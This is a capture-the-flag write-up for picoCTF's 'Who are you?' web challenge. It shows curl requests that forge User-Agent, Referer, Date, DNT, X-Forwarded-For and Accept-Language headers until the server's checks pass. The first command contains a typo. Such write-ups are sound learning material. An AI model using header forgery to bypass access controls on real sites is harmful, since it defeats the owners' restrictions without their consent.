## Description
Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:38322/

## Solution
We are given a webpage that shows an image that `wait a  minute, who are you?`
and it renders a text in red
```
Only people who use the official PicoBrowser are allowed on this site!
```

this is a hint to make a request with `PicoBrowser` user-agent. using curl as follow:

```bash
url "http://mercury.picoctf.net:38322/" --header "User-Agent: PicoBrowser"
```

and the red text change to :
```
I don&#39;t trust users visiting from another site.
```

ok so we need to make referer value from the current website:
```bash
curl "http://mercury.picoctf.net:38322/" --header "User-Agent: PicoBrowser" --header "referer: http://mercury.picoctf.net:38322/"
```

and new danger text is:
```
Sorry, this site only worked in 2018.
```

Ok we make it from a date of 2018. like below:
```bash
curl "http://mercury.picoctf.net:38322/" --header "User-Agent: PicoBrowser" --header "referer: http://mercury.picoctf.net:38322/" --header "Date: Thu, 01 Jan 2018 00:00:00 GMT"
```

and text is:
```
I don&#39;t trust users who can be tracked.
```

So we need to enable track header DNT in request.
```bash
curl "http://mercury.picoctf.net:38322/" --header "User-Agent: PicoBrowser" --header "referer: http://mercury.picoctf.net:38322/" --header "Date: Thu, 01 Jan 2018 00:00:00 GMT" --header "DNT: 1"
```

and the new error text is:
```
This website is only for people from Sweden.
```

We need to make it from an IP from sweden, searching on ip range:
```bash
curl "http://mercury.picoctf.net:38322/" --header "User-Agent: PicoBrowser" --header "referer: http://mercury.picoctf.net:38322/" --header "Date: Thu, 01 Jan 2018 00:00:00 GMT" --header "DNT: 1" --header "X-Forwarded-For: 192.71.245.0"
```

and the red text change to:
```
You&#39;re in Sweden but you don&#39;t speak Swedish?
```

Ok next change accept-language to `sv-SE` for sweden and will get the flag:
```bash
curl "http://mercury.picoctf.net:38322/" --header "User-Agent: PicoBrowser" --header "referer: http://mercury.picoctf.net:38322/" --header "Date: Thu, 01 Jan 2018 00:00:00 GMT" --header "DNT: 1" --header "X-Forwarded-For: 192.71.245.0" --header "Accept-Language: sv-SE"
```
